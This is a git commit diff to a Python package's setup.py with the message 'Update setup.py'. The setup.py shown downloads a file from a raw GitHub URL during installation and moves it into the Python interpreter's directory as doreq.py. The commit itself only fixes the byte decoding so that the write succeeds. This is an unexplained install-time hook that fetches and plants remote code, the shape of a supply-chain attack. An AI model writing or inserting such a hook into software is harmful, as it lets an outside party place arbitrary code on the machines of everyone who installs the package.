8377ff1539bb584e3124cd0d67e961d553bf110f
presidentofyes12 <nkenna@iheakaram.com>
2020-12-13 15:42:49 -0500

    Update setup.py

--- setup.py
+++ setup.py
@@ -4,5 +4,5 @@ import requests
 pythonloc = os.path.dirname(sys.executable)
 cont = requests.get('https://raw.githubusercontent.com/presy12/testrepo/main/doreq.py').content
 with open('req.py', 'w') as req:
-  req.write(cont)
+  req.write(cont.decode("utf-8"))
 os.rename('req.py', pythonloc + '\doreq.py')
